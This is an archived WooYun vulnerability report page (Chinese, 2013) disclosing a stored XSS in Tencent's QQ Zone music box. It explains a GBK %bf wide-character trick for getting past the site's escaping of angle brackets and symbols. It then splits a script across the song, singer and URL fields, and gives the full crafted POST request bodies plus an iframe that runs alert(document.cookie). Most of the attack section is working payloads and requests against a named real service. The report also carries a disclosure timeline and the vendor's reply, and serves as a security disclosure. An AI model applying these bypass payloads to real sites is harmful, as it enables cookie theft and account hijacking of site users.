@@ -1,0 +1,324 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		腾讯一处存储型XSS - 有过滤？我绕绕绕！  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		腾讯一处存储型XSS - 有过滤？我绕绕绕！  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/多多关照">多多关照</a> 
+</li><li>提交时间：		2013-07-04 21:40</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-07-04：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-07-08：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-07-18：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-07-28：	细节向普通白帽子公开<br/>
+									2013-08-07：	细节向实习白帽子公开<br/>
+									2013-08-18：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">过滤了&lt;,&gt;？ 我绕！<br />
+过滤了() ？ 我绕！<br />
+想用/**/注释下，竟然连*都过滤了... 我绕绕绕！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">有问题的地址是：http://qzone-music.qq.com/fcg-bin/fcg_music_fav_getinfo.fcg?dirinfo=1&amp;dirid=201&amp;uin=QQ号码&amp;p=0.887586027616635&amp;inCharset=GB2312&amp;outCharset=utf-32&amp;hostUin=&amp;notice=0&amp;needNewCode=0&amp;format=jsonp&amp;platform=musicbox&amp;jsonpCallback=jsonCallback<br />
+<br />
+<br />
+<br />
+这个地址会输出QQ号码在QQ空间音乐盒中【我喜欢】这个专辑中的音乐内容，包括歌手，歌曲名，歌曲地址等信息。<br />
+<br />
+<br />
+<br />
+正常情况下，歌手名字，歌曲名，歌曲地址里的&lt; , &gt;都会被过滤掉，即过滤成为 &amp;lt; &amp;gt;<br />
+<br />
+<br />
+<br />
+在这一步，我们对应的绕过方法是：<br />
+<br />
+<br />
+<br />
+%bf&lt;script/%bf&gt;<br />
+<br />
+<br />
+<br />
+原理是：服务器上会过滤数据中的特殊符号，但是当读取到%bf时，会认为%bf&lt;是一个GBK字符，从而当作一个字符来看待。 即过滤程序会把上面的内容看作是:<br />
+<br />
+<br />
+<br />
+[GBK字符]script/[GBK字符]<br />
+<br />
+<br />
+<br />
+然后当上面内容输出到页面的时候，内容则会变为<br />
+<br />
+<br />
+<br />
+口&lt;script/口&gt;  (其中“口”为不被识别的字符)<br />
+<br />
+<br />
+<br />
+从而，我们插入了一个&lt;script&gt;<br />
+<br />
+<br />
+<br />
+---------------------------------------------------------------<br />
+<br />
+<br />
+<br />
+通过以上方法，我们可以写出以下代码<br />
+<br />
+<br />
+<br />
+</p><pre><code>%bf&lt;script/%bf&gt;alert(1);%bf&lt;/script/%bf&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+不幸的是，在歌曲标题内插入这段内容后，发现(, ) 都被转义成为 &amp;#xxxx; 的形式了。<br />
+<br />
+<br />
+<br />
+alert没法执行了，而且，括号都用不了，代码就执行不了了。<br />
+<br />
+<br />
+<br />
+---------------------------------------------------------------<br />
+<br />
+<br />
+<br />
+然而，我们是可以控制多个输出点的。 如下，songname, singername, url<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><pre><code>songname:&quot;控制点1&quot;,singerid:0,singername:&quot;控制点2&quot;,url:&quot;控制点3&quot;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+也就是说，我们可以采用注释的办法来进入后面的点，如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>songname:&quot;aaaaaaa&quot;,singerid:0,singername:&quot;口&lt;script/口&gt;/*&quot;,url:&quot;*/;alert(1)//&quot;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+但是这个点中，*都被过滤成 &amp;#xxxx 了。继续测试发现，不仅是括号，星号，连=, + ,%，基本只要是符号，都过滤的差不多了。还好，[,], / 没被过滤。 加上我们意外的惊喜发现，url和songname,singername的过滤规则不同，并没有过滤如此多的符号。所以:<br />
+<br />
+<br />
+<br />
+</p><pre><code>songname:&quot;aaaaaaa&quot;,singerid:0,singername:&quot;口&lt;script/口&gt;[&quot;,url:&quot;];alert(1)/*&quot;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+---------------------------------------------------------------<br />
+<br />
+<br />
+<br />
+上面这首歌，完成了 &lt;script&gt;[&quot;,url:&quot;];alert(1)/* ....<br />
+<br />
+<br />
+<br />
+再编辑下一首歌，修改songname，加入&lt;/script&gt;以闭合脚本标签。<br />
+<br />
+<br />
+<br />
+</p><pre><code>songname:&quot;口*///口&lt;/script/口&gt;&quot;,singerid:0,......</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+最后就成功构造了。具体利用过程写在了漏洞证明里。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">进QQ空间音乐盒中的【我喜欢】目录中，<br />
+<br />
+<br />
+<br />
+1. 先修改第一首歌，抓包，修改包<br />
+<br />
+<br />
+<br />
+URL：http://qzone-music.qq.com/cgi-bin/v5/cgi_music_modsong_new?g_tk=1232408522<br />
+<br />
+<br />
+<br />
+发第一个包, 修改了包里的url和singer参数<br />
+<br />
+<br />
+<br />
+</p><pre><code>formsender=1&amp;out=2&amp;from=1&amp;source=103&amp;uin=8639560&amp;songid=4283798478&amp;type=1&amp;urlchanged=1&amp;moodchanged=0&amp;url=];alert(1);/*http%3A%2F%2Fwww.baidu.com%2F1.wma&amp;songtitle=aaa&amp;singer=%bf&lt;script/%bf&gt;[&amp;dirid=201&amp;desc=&amp;inCharset=GB2312&amp;hostUin=8639560&amp;notice=0&amp;needNewCode=0&amp;g_tk=1232408522&amp;format=fs&amp;platform=musicbox&amp;outCharset=gb2312</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0420192918fb48c88cf3db5481f40fc6ac02e2a9.jpg" target="_blank"><img src="../images/0420192918fb48c88cf3db5481f40fc6ac02e2a9.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. 再修改第二首歌，抓包，修改包, 地址同1，修改了songtitle参数<br />
+<br />
+<br />
+<br />
+</p><pre><code>formsender=1&amp;out=2&amp;from=1&amp;source=103&amp;uin=8639560&amp;songid=2329826814&amp;type=1&amp;urlchanged=0&amp;moodchanged=0&amp;url=http%3A%2F%2Fwww.baidu.com%2F1.mp3&amp;songtitle=%bf*///%bf&lt;/script/%bf&gt;&amp;singer=%CE%D2%C3%C7%B5%C4%B0%AE&amp;dirid=201&amp;desc=&amp;inCharset=GB2312&amp;hostUin=8639560&amp;notice=0&amp;needNewCode=0&amp;g_tk=1232408522&amp;format=fs&amp;platform=musicbox&amp;outCharset=gb2312</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0420194124e877c328d97d0293f47b5fca2ee163.jpg" target="_blank"><img src="../images/0420194124e877c328d97d0293f47b5fca2ee163.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 最后效果如下：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/042021452762a4d612bbac6e3cca4112250cf620.jpg" target="_blank"><img src="../images/042021452762a4d612bbac6e3cca4112250cf620.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4. 然后利用iframe来利用即可。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;iframe name=&quot;alert(document.cookie)&quot; src=&quot;http://qzone-music.qq.com/fcg-bin/fcg_music_fav_getinfo.fcg?dirinfo=1&amp;dirid=201&amp;uin=QQ号码&amp;format=jsonp&amp;platform=musicbox&amp;jsonpCallback=jsonCallback&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/042024123cab6dab9b25989bd31f8b1969a53c2e.jpg" target="_blank"><img src="../images/042024123cab6dab9b25989bd31f8b1969a53c2e.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">换个函数或者方法过滤符号。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/多多关照" title="多多关照">多多关照</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-027762" title="腾讯一处存储型XSS - 有过滤？我绕绕绕！">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-07-08 10:06</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢反馈，我们正在处理中。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="27762";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
